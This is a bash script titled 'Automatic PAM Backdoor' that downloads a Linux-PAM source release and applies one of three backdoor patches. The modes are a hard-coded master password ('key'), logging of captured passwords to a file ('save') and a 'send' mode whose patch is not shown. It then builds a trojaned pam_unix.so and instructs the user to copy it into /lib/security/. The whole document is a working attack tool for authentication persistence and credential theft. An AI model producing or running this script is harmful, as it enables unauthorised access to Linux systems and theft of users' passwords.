#!/bin/bash

OPTIND=1

PAM_VERSION=
PAM_FILE=
PASSWORD=
OUTFILE=
MODE=
echo "Automatic PAM Backdoor"

function show_help {
	echo ""
	echo "Example usage: $0 -m key|save|send -v 1.3.0 -p some_s3cr3t_p455word -o /tmp/pwd.log"
	echo "For a list of supported versions: https://github.com/linux-pam/linux-pam/releases"
}

while getopts ":h:?:p:v:o:m:" opt; do
    case "$opt" in
    h|\?)
        show_help
        exit 0
        ;;
    v)  PAM_VERSION="$OPTARG"
        ;;
    p)  PASSWORD="$OPTARG"
        ;;
    o) OUTFILE="$OPTARG"
	;;
    m) MODE="$OPTARG"
    esac
done

shift $((OPTIND-1))

[ "$1" = "--" ] && shift

if [ -z $PAM_VERSION ]; then
	show_help
	exit 1
fi;

if [ -z $PASSWORD ]; then
	if [ "$MODE" == "key" ];then
		show_help
		exit 1
	fi;	
fi;
if [ -z $MODE ]; then
	show_help
	exit 1
fi;
if [ -z $OUTFILE ];then
	if [$MODE == "save"];then
		show_help
		exit 1
	fi;
fi;

echo "PAM Version: $PAM_VERSION"
echo "Password: $PASSWORD"
echo "Password Record Path: $OUTFILE"

PAM_BASE_URL="http://www.linux-pam.org/library"
PAM_DIR="Linux-PAM-${PAM_VERSION}"
PAM_FILE="${PAM_DIR}.tar.gz"
PATCH_DIR=`which patch`

if [ $? -ne 0 ]; then
	echo "Error: patch command not found. Exiting..."
	exit 1
fi
wget -c "${PAM_BASE_URL}/${PAM_FILE}"
if [[ $? -ne 0 ]]; then # did not work, trying the old format    
    PAM_DIR="linux-pam-Linux-PAM-${PAM_VERSION}"
    PAM_FILE="Linux-PAM-${PAM_VERSION}.tar.gz"
    wget -c "${PAM_BASE_URL}/${PAM_FILE}"
    if [[ $? -ne 0 ]]; then
        # older version need a _ instead of a .
        PAM_VERSION="$(echo $PAM_VERSION | tr '.' '_')"  
        PAM_DIR="linux-pam-Linux-PAM-${PAM_VERSION}"
        PAM_FILE="Linux-PAM-${PAM_VERSION}.tar.gz"
        wget -c "${PAM_BASE_URL}/${PAM_FILE}"
        if [[ $? -ne 0 ]]; then        
            echo "Failed to download"
            exit 1
        fi        
    fi
fi

tar xzf $PAM_FILE


PATH_FILE_DIR=
case ${MODE} in
	key) 
		PATH_FILE_DIR=backdoor.patch
		cat ${PATH_FILE_DIR} | sed -e "s/_PASSWORD_/${PASSWORD}/g" | patch -p1 -d $PAM_DIR
		;;
	save)
		PATH_FILE_DIR=backdoor2.patch
		cat ${PATH_FILE_DIR} | sed -e "s#_OUTFILE_#${OUTFILE}#g" | patch -p1 -d $PAM_DIR
		;;
	send)PATH_FILE_DIR=backdoor3.patch;;	
esac
echo "Using Mode:${MODE}"
echo "Patch Path:${PATH_FILE_DIR}"
#cat ${PATH_FILE_DIR}

#cat ${PATH_FILE_DIR} | sed -e "s/_PASSWORD_/${PASSWORD}/g" | sed -e "s/_OUTFILE_/${OUTFILE}/g" | patch -p1 -d $PAM_DIR

cd $PAM_DIR
# newer version need autogen to generate the configure script
if [[ ! -f "./configure" ]]; then 
    ./autogen.sh 
fi 
./configure
make
cp modules/pam_unix/.libs/pam_unix.so ../
cd ..
echo "Backdoor created."
echo "Now copy the generated ./pam_unix.so to the right directory (usually /lib/security/)"
echo ""

